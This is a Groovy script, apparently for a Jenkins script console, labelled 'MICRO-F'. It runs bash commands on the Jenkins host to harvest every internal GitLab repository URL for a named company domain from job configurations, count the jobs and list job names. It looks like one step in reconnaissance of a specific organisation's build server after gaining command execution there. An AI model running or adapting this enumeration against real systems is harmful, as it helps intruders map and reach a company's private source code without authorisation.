// MICRO-F: List all GitLab repo URLs (consumeProcessOutput fixed)
def run = { cmd ->
    def p = ["bash", "-c", cmd].execute()
    def out = new StringBuffer()
    def err = new StringBuffer()
    p.consumeProcessOutput(out, err)
    p.waitForOrKill(20000)
    out.toString().take(6000)
}

println "=== ALL GITLAB REPO URLS ==="
println run('grep -roh "https://gitlab\\.dev\\.claroshop\\.com/[a-zA-Z0-9._/-]*.git" /var/jenkins_home/jobs/ 2>/dev/null | sort -u')

println "\n=== GITLAB URLs (no .git) ==="
println run('grep -roh "https://gitlab\\.dev\\.claroshop\\.com/[a-zA-Z0-9._/-]*" /var/jenkins_home/jobs/ 2>/dev/null | sed "s/.git$//" | sort -u')

println "\n=== JOB COUNT ==="
println run('find /var/jenkins_home/jobs -name config.xml 2>/dev/null | wc -l')

println "\n=== SAMPLE JOB NAMES ==="
println run('find /var/jenkins_home/jobs -maxdepth 2 -name config.xml 2>/dev/null | head -30 | xargs -I{} dirname {} | xargs -I{} basename {}')

println "\n=== DONE MICRO-F ==="
